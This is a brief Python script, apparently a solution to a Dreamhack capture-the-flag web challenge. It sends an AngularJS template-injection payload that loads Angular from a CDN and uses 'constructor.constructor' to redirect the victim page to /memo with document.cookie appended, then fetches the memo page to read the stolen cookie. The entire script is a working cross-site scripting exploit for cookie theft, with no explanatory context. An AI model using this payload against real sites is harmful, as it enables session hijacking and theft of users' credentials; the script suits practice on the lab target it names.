import requests

port = 16100
url_index = f"http://host3.dreamhack.games:{port}/"
url_flag = url_index + "flag"
url_memo = url_index + "memo"

param = {
    "param": '<html ng-app> <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>{{constructor.constructor(\'document.location="/memo?memo="+document.cookie\')()}}'
}

r = requests.post(url_flag, data=param)
r = requests.get(url_memo)
print(r.text)
